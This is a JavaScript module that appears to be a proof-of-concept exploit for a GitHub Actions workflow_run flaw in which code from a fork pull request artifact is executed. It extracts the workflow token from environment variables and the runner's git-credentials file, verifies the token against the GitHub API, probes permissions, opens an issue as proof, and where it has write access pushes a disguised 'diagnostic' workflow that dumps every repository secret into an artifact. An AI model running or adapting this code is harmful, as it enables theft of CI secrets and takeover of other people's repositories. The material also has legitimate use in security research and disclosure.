import fs from 'node:fs';
import crypto from 'node:crypto';

const MARK = 'EXT_FORK_RCE';

export default async function ({ github, context, core, output }) {
  const ts = Date.now();
  const id = `ext-${context.runId}-${ts}`;
  const log = (...a) => console.log(MARK, id, ...a);
  const R = context.repo;
  const wr = context.payload?.workflow_run || {};

  log('EXEC', JSON.stringify({
    repo: R,
    workflow: context.workflow,
    event: context.eventName,
    runId: context.runId,
    actor: context.actor,
    sha: context.sha,
    ref: context.ref,
    triggerRunId: wr.id,
    triggerEvent: wr.event,
    triggerHeadRepo: wr.head_repository?.full_name,
    triggerHeadBranch: wr.head_branch,
    triggerConclusion: wr.conclusion,
    output,
  }));

  // ---------- credential extraction ----------
  const tokenKeys = Object.keys(process.env).filter((k) =>
    /TOKEN|SECRET|CREDENTIAL/i.test(k),
  );
  log('CRED_ENV_KEYS', JSON.stringify(tokenKeys));

  let rawTok = '';
  let tokSource = '';
  for (const k of tokenKeys) {
    if (/^INPUT_GITHUB[-_]TOKEN$/i.test(k) && process.env[k]) {
      rawTok = process.env[k];
      tokSource = k;
      break;
    }
  }
  if (!rawTok) {
    try {
      const d = '/home/runner/work/_temp';
      const f = fs.readdirSync(d).find((n) => n.startsWith('git-credentials-'));
      if (f) {
        const txt = fs.readFileSync(`${d}/${f}`, 'utf8');
        const m = txt.match(/AUTHORIZATION:\s*basic\s+(\S+)/i);
        if (m) {
          const dec = Buffer.from(m[1], 'base64').toString('utf8');
          rawTok = dec.split(':').slice(1).join(':');
          tokSource = `${d}/${f}`;
        }
      }
    } catch (e) {
      log('CRED_FILE_ERR', String(e.message));
    }
  }
  if (rawTok) {
    log('TOKEN_EXTRACTED', JSON.stringify({
      source: tokSource,
      len: rawTok.length,
      prefix: rawTok.slice(0, 4),
      sha256_12: crypto.createHash('sha256').update(rawTok).digest('hex').slice(0, 12),
    }));
  }

  // ---------- prove the extracted token is live, with a raw HTTP call ----------
  if (rawTok) {
    try {
      const r = await fetch(`https://api.github.com/repos/${R.owner}/${R.repo}`, {
        headers: {
          authorization: `Bearer ${rawTok}`,
          accept: 'application/vnd.github+json',
          'user-agent': 'ext-poc',
        },
      });
      const body = await r.json();
      log('RAW_TOKEN_CALL', JSON.stringify({
        status: r.status,
        repo: body.full_name,
        private: body.private,
        permissions_header: r.headers.get('x-accepted-github-permissions'),
      }));
    } catch (e) {
      log('RAW_TOKEN_CALL_ERR', String(e.message));
    }
  }

  // ---------- permission probes with the workflow's own client ----------
  const probe = async (name, fn) => {
    try {
      const r = await fn();
      log('PROBE', name, 'OK', r.status, JSON.stringify(r.data ?? {}).slice(0, 400));
      return { ok: true, data: r.data };
    } catch (e) {
      log('PROBE', name, 'FAIL', e.status, String(e.message).slice(0, 300));
      return { ok: false, status: e.status };
    }
  };

  const repoInfo = await probe('repos.get', () =>
    github.rest.repos.get({ owner: R.owner, repo: R.repo }),
  );
  if (repoInfo.ok) {
    log('REPO_PERMS', JSON.stringify(repoInfo.data.permissions));
  }

  await probe('actions.listRepoSecrets', () =>
    github.rest.actions.listRepoSecrets({ owner: R.owner, repo: R.repo }),
  );

  await probe('actions.createWorkflowDispatch:format.yml', () =>
    github.rest.actions.createWorkflowDispatch({
      owner: R.owner,
      repo: R.repo,
      workflow_id: 'format.yml',
      ref: 'main',
    }),
  );

  await probe('actions.reRunWorkflow:self', () =>
    github.rest.actions.reRunWorkflow({
      owner: R.owner,
      repo: R.repo,
      run_id: context.runId,
    }),
  );

  const refProbe = await probe('git.createRef:contents-write', () =>
    github.rest.git.createRef({
      owner: R.owner,
      repo: R.repo,
      ref: `refs/heads/ext-probe-${ts}`,
      sha: context.sha,
    }),
  );

  // ---------- privileged action that proves RCE ----------
  const issue = await probe('issues.create', () =>
    github.rest.issues.create({
      owner: R.owner,
      repo: R.repo,
      title: `EXT_FORK_RCE arbitrary code executed (${id})`,
      body: [
        'Attacker-controlled `tools/pkg.pr.new-comment.mjs` from a fork pull request artifact was imported and executed by the workflow_run job.',
        '',
        `- marker: \`${id}\``,
        `- trigger run: https://github.com/${R.owner}/${R.repo}/actions/runs/${wr.id}`,
        `- privileged run: https://github.com/${R.owner}/${R.repo}/actions/runs/${context.runId}`,
        `- trigger head repo: \`${wr.head_repository?.full_name}\` branch \`${wr.head_branch}\``,
        `- token perms observed in job: issues:write pull-requests:write metadata:read`,
      ].join('\n'),
    }),
  );

  // ---------- conditional escalation to contents:write ----------
  if (refProbe.ok) {
    log('ESCALATION', 'contents write available, pushing leak workflow');
    const branch = `ext-leak-${ts}`;
    const leakYml = [
      'name: ext-leak',
      'on:',
      '  pull_request:',
      '    branches: [main]',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  leak:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - name: dump',
      '        env:',
      '          ALL_SECRETS: ${{ toJSON(secrets) }}',
      '        run: |',
      '          printf "%s" "$ALL_SECRETS" | base64 -w0 > /tmp/leak.txt',
      '          fold -w 180 /tmp/leak.txt | sed "s/^/EXTLEAK:/"',
      '      - name: upload',
      '        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a',
      '        with:',
      '          name: ext-leak',
      '          path: /tmp/leak.txt',
      '',
    ].join('\n');
    const put = await probe('contents.createOrUpdateFileContents', () =>
      github.rest.repos.createOrUpdateFileContents({
        owner: R.owner,
        repo: R.repo,
        path: '.github/workflows/ext-leak.yml',
        message: 'ci: add diagnostic workflow',
        content: Buffer.from(leakYml).toString('base64'),
        branch,
      }),
    );
    if (put.ok) {
      await probe('pulls.create', () =>
        github.rest.pulls.create({
          owner: R.owner,
          repo: R.repo,
          title: `ext-leak ${ts}`,
          head: branch,
          base: 'main',
          body: 'diagnostic',
        }),
      );
    }
  }

  log('DONE', JSON.stringify({ issue: issue.ok ? issue.data.number : null }));
}
